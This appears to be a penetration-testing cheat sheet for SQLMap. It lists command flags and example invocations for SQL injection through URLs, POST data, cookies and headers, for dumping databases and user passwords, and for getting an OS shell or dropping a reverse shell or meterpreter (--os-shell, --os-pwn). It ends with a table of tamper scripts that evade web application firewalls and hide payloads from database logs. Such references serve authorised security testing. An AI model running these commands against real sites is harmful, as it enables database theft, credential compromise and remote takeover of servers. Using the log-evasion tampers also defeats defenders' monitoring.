<h1 id="SQLMap-Cheetsheat"><a href="#SQLMap-Cheetsheat" class="headerlink" title="SQLMap - Cheetsheat"></a>SQLMap - Cheetsheat</h1><h2 id="Basic-arguments-for-SQLmap"><a href="#Basic-arguments-for-SQLmap" class="headerlink" title="Basic arguments for SQLmap"></a>Basic arguments for SQLmap</h2><h3 id="Generic"><a href="#Generic" class="headerlink" title="Generic"></a>Generic</h3><pre><code class="bash">-u &quot;&lt;URL&gt;&quot; 
-p &quot;&lt;PARAM TO TEST&gt;&quot; 
--user-agent=SQLMAP 
--random-agent 
--threads=10 
--risk=3 #MAX
--level=5 #MAX
--dbms=&quot;&lt;KNOWN DB TECH&gt;&quot; 
--os=&quot;&lt;OS&gt;&quot;
--technique=&quot;UB&quot; #Use only techniques UNION and BLIND in that order (default &quot;BEUSTQ&quot;)
--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--auth-type=&quot;&lt;AUTH&gt;&quot; #HTTP authentication type (Basic, Digest, NTLM or PKI)
--auth-cred=&quot;&lt;AUTH&gt;&quot; #HTTP authentication credentials (name:password)
--proxy=PROXY
--union-char &quot;GsFRts2&quot; #Help sqlmap identify union SQLi techniques with a weird union char
</code></pre>
<h3 id="Retrieve-Information"><a href="#Retrieve-Information" class="headerlink" title="Retrieve Information"></a>Retrieve Information</h3><h4 id="Internal"><a href="#Internal" class="headerlink" title="Internal"></a>Internal</h4><pre><code class="bash">--current-user #Get current user
--is-dba #Check if current user is Admin
--hostname #Get hostname
--users #Get usernames od DB
--passwords #Get passwords of users in DB
</code></pre>
<h4 id="DB-data"><a href="#DB-data" class="headerlink" title="DB data"></a>DB data</h4><pre><code class="bash">--all #Retrieve everything
--dump #Dump DBMS database table entries
--dbs #Names of the available databases
--tables #Tables of a database ( -D &lt;DB NAME&gt; )
--columns #Columns of a table  ( -D &lt;DB NAME&gt; -T &lt;TABLE NAME&gt; )
-D &lt;DB NAME&gt; -T &lt;TABLE NAME&gt; -C &lt;COLUMN NAME&gt; #Dump column
</code></pre>
<h2 id="Injection-place"><a href="#Injection-place" class="headerlink" title="Injection place"></a>Injection place</h2><h3 id="From-Burp-ZAP-capture"><a href="#From-Burp-ZAP-capture" class="headerlink" title="From Burp/ZAP capture"></a>From Burp/ZAP capture</h3><p>Capture the request and create a req.txt file</p>
<pre><code class="bash">sqlmap -r req.txt --current-user
</code></pre>
<h3 id="GET-Request-Injection"><a href="#GET-Request-Injection" class="headerlink" title="GET Request Injection"></a>GET Request Injection</h3><pre><code class="bash">sqlmap -u &quot;http://example.com/?id=1&quot; -p id
sqlmap -u &quot;http://example.com/?id=*&quot; -p id
</code></pre>
<h3 id="POST-Request-Injection"><a href="#POST-Request-Injection" class="headerlink" title="POST Request Injection"></a>POST Request Injection</h3><pre><code class="bash">sqlmap -u &quot;http://example.com&quot; --data &quot;username=*&amp;password=*&quot;
</code></pre>
<h3 id="Injections-in-Headers-and-other-HTTP-Methods"><a href="#Injections-in-Headers-and-other-HTTP-Methods" class="headerlink" title="Injections in Headers and other HTTP Methods"></a>Injections in Headers and other HTTP Methods</h3><pre><code class="bash">#Inside cookie
sqlmap  -u &quot;http://example.com&quot; --cookie &quot;mycookies=*&quot;

#Inside some header
sqlmap -u &quot;http://example.com&quot; --headers=&quot;x-forwarded-for:127.0.0.1*&quot;
sqlmap -u &quot;http://example.com&quot; --headers=&quot;referer:*&quot;

#PUT Method
sqlmap --method=PUT -u &quot;http://example.com&quot; --headers=&quot;referer:*&quot;

#The injection is located at the &#39;*&#39;
</code></pre>
<h3 id="Second-order-injection"><a href="#Second-order-injection" class="headerlink" title="Second order injection"></a>Second order injection</h3><pre><code class="bash">python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order &quot;http://targetapp/wishlist&quot; -v 3
sqlmap -r 1.txt -dbms MySQL -second-order &quot;http://&lt;IP/domain&gt;/joomla/administrator/index.php&quot; -D &quot;joomla&quot; -dbs
</code></pre>
<h3 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h3><pre><code class="bash">#Exec command
python sqlmap.py -u &quot;http://example.com/?id=1&quot; -p id --os-cmd whoami

#Simple Shell
python sqlmap.py -u &quot;http://example.com/?id=1&quot; -p id --os-shell

#Dropping a reverse-shell / meterpreter
python sqlmap.py -u &quot;http://example.com/?id=1&quot; -p id --os-pwn
</code></pre>
<h3 id="Crawl-a-website-with-SQLmap-and-auto-exploit"><a href="#Crawl-a-website-with-SQLmap-and-auto-exploit" class="headerlink" title="Crawl a website with SQLmap and auto-exploit"></a>Crawl a website with SQLmap and auto-exploit</h3><pre><code class="bash">sqlmap -u &quot;http://example.com/&quot; --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms
</code></pre>
<h3 id="Second-Order-Injection"><a href="#Second-Order-Injection" class="headerlink" title="Second Order Injection"></a>Second Order Injection</h3><p>****<a href="second-order-injection-sqlmap.md"><strong>Read this post</strong> </a><strong>about how to perform simple and complex second order injections with sqlmap.</strong></p>
<h2 id="Customizing-Injection"><a href="#Customizing-Injection" class="headerlink" title="Customizing Injection"></a>Customizing Injection</h2><h3 id="Set-a-suffix"><a href="#Set-a-suffix" class="headerlink" title="Set a suffix"></a>Set a suffix</h3><pre><code class="bash">python sqlmap.py -u &quot;http://example.com/?id=1&quot;  -p id --suffix=&quot;-- &quot;
</code></pre>
<h3 id="Prefix"><a href="#Prefix" class="headerlink" title="Prefix"></a>Prefix</h3><pre><code class="bash">python sqlmap.py -u &quot;http://example.com/?id=1&quot;  -p id --prefix=&quot;&#39;) &quot;
</code></pre>
<h3 id="Help-finding-boolean-injection"><a href="#Help-finding-boolean-injection" class="headerlink" title="Help finding boolean injection"></a>Help finding boolean injection</h3><pre><code class="bash"># The --not-string &quot;string&quot; will help finding a string that does not appear in True responses (for finding boolean blind injection)
sqlmap -r r.txt -p id --not-string ridiculous --batch
</code></pre>
<h3 id="Tamper"><a href="#Tamper" class="headerlink" title="Tamper"></a>Tamper</h3><p>Remember that <strong>you can create your own tamper in python</strong> and it’s very simple. You can find a tamper example in the <a href="second-order-injection-sqlmap.md">Second Order Injection page here</a>.</p>
<pre><code class="bash">--tamper=name_of_the_tamper
#In kali you can see all the tampers in /usr/share/sqlmap/tamper
</code></pre>
<table>
<thead>
<tr>
<th align="left">Tamper</th>
<th align="left">Description</th>
</tr>
</thead>
<tbody><tr>
<td align="left">apostrophemask.py</td>
<td align="left">Replaces apostrophe character with its UTF-8 full width counterpart</td>
</tr>
<tr>
<td align="left">apostrophenullencode.py</td>
<td align="left">Replaces apostrophe character with its illegal double unicode counterpart</td>
</tr>
<tr>
<td align="left">appendnullbyte.py</td>
<td align="left">Appends encoded NULL byte character at the end of payload</td>
</tr>
<tr>
<td align="left">base64encode.py</td>
<td align="left">Base64 all characters in a given payload</td>
</tr>
<tr>
<td align="left">between.py</td>
<td align="left">Replaces greater than operator (‘&gt;’) with ‘NOT BETWEEN 0 AND #‘</td>
</tr>
<tr>
<td align="left">bluecoat.py</td>
<td align="left">Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator</td>
</tr>
<tr>
<td align="left">chardoubleencode.py</td>
<td align="left">Double url-encodes all characters in a given payload (not processing already encoded)</td>
</tr>
<tr>
<td align="left">commalesslimit.py</td>
<td align="left">Replaces instances like ‘LIMIT M, N’ with ‘LIMIT N OFFSET M’</td>
</tr>
<tr>
<td align="left">commalessmid.py</td>
<td align="left">Replaces instances like ‘MID(A, B, C)‘ with ‘MID(A FROM B FOR C)‘</td>
</tr>
<tr>
<td align="left">concat2concatws.py</td>
<td align="left">Replaces instances like ‘CONCAT(A, B)‘ with ‘CONCAT_WS(MID(CHAR(0), 0, 0), A, B)‘</td>
</tr>
<tr>
<td align="left">charencode.py</td>
<td align="left">Url-encodes all characters in a given payload (not processing already encoded)</td>
</tr>
<tr>
<td align="left">charunicodeencode.py</td>
<td align="left">Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded). “%u0022”</td>
</tr>
<tr>
<td align="left">charunicodeescape.py</td>
<td align="left">Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded). “\u0022”</td>
</tr>
<tr>
<td align="left">equaltolike.py</td>
<td align="left">Replaces all occurances of operator equal (‘=’) with operator ‘LIKE’</td>
</tr>
<tr>
<td align="left">escapequotes.py</td>
<td align="left">Slash escape quotes (‘ and “)</td>
</tr>
<tr>
<td align="left">greatest.py</td>
<td align="left">Replaces greater than operator (‘&gt;’) with ‘GREATEST’ counterpart</td>
</tr>
<tr>
<td align="left">halfversionedmorekeywords.py</td>
<td align="left">Adds versioned MySQL comment before each keyword</td>
</tr>
<tr>
<td align="left">ifnull2ifisnull.py</td>
<td align="left">Replaces instances like ‘IFNULL(A, B)‘ with ‘IF(ISNULL(A), B, A)‘</td>
</tr>
<tr>
<td align="left">modsecurityversioned.py</td>
<td align="left">Embraces complete query with versioned comment</td>
</tr>
<tr>
<td align="left">modsecurityzeroversioned.py</td>
<td align="left">Embraces complete query with zero-versioned comment</td>
</tr>
<tr>
<td align="left">multiplespaces.py</td>
<td align="left">Adds multiple spaces around SQL keywords</td>
</tr>
<tr>
<td align="left">nonrecursivereplacement.py</td>
<td align="left">Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace(“SELECT”, “”)) filters</td>
</tr>
<tr>
<td align="left">percentage.py</td>
<td align="left">Adds a percentage sign (‘%’) infront of each character</td>
</tr>
<tr>
<td align="left">overlongutf8.py</td>
<td align="left">Converts all characters in a given payload (not processing already encoded)</td>
</tr>
<tr>
<td align="left">randomcase.py</td>
<td align="left">Replaces each keyword character with random case value</td>
</tr>
<tr>
<td align="left">randomcomments.py</td>
<td align="left">Add random comments to SQL keywords</td>
</tr>
<tr>
<td align="left">securesphere.py</td>
<td align="left">Appends special crafted string</td>
</tr>
<tr>
<td align="left">sp_password.py</td>
<td align="left">Appends ‘sp_password’ to the end of the payload for automatic obfuscation from DBMS logs</td>
</tr>
<tr>
<td align="left">space2comment.py</td>
<td align="left">Replaces space character (‘ ‘) with comments</td>
</tr>
<tr>
<td align="left">space2dash.py</td>
<td align="left">Replaces space character (‘ ‘) with a dash comment (‘–’) followed by a random string and a new line (‘\n’)</td>
</tr>
<tr>
<td align="left">space2hash.py</td>
<td align="left">Replaces space character (‘ ‘) with a pound character (‘#‘) followed by a random string and a new line (‘\n’)</td>
</tr>
<tr>
<td align="left">space2morehash.py</td>
<td align="left">Replaces space character (‘ ‘) with a pound character (‘#‘) followed by a random string and a new line (‘\n’)</td>
</tr>
<tr>
<td align="left">space2mssqlblank.py</td>
<td align="left">Replaces space character (‘ ‘) with a random blank character from a valid set of alternate characters</td>
</tr>
<tr>
<td align="left">space2mssqlhash.py</td>
<td align="left">Replaces space character (‘ ‘) with a pound character (‘#‘) followed by a new line (‘\n’)</td>
</tr>
<tr>
<td align="left">space2mysqlblank.py</td>
<td align="left">Replaces space character (‘ ‘) with a random blank character from a valid set of alternate characters</td>
</tr>
<tr>
<td align="left">space2mysqldash.py</td>
<td align="left">Replaces space character (‘ ‘) with a dash comment (‘–’) followed by a new line (‘\n’)</td>
</tr>
<tr>
<td align="left">space2plus.py</td>
<td align="left">Replaces space character (‘ ‘) with plus (‘+’)</td>
</tr>
<tr>
<td align="left">space2randomblank.py</td>
<td align="left">Replaces space character (‘ ‘) with a random blank character from a valid set of alternate characters</td>
</tr>
<tr>
<td align="left">symboliclogical.py</td>
<td align="left">Replaces AND and OR logical operators with their symbolic counterparts (&amp;&amp; and</td>
</tr>
<tr>
<td align="left">unionalltounion.py</td>
<td align="left">Replaces UNION ALL SELECT with UNION SELECT</td>
</tr>
<tr>
<td align="left">unmagicquotes.py</td>
<td align="left">Replaces quote character (‘) with a multi-byte combo %bf%27 together with generic comment at the end (to make it work)</td>
</tr>
<tr>
<td align="left">uppercase.py</td>
<td align="left">Replaces each keyword character with upper case value ‘INSERT’</td>
</tr>
<tr>
<td align="left">varnish.py</td>
<td align="left">Append a HTTP header ‘X-originating-IP’</td>
</tr>
<tr>
<td align="left">versionedkeywords.py</td>
<td align="left">Encloses each non-function keyword with versioned MySQL comment</td>
</tr>
<tr>
<td align="left">versionedmorekeywords.py</td>
<td align="left">Encloses each keyword with versioned MySQL comment</td>
</tr>
<tr>
<td align="left">xforwardedfor.py</td>
<td align="left">Append a fake HTTP header ‘X-Forwarded-For’</td>
</tr>
</tbody></table>
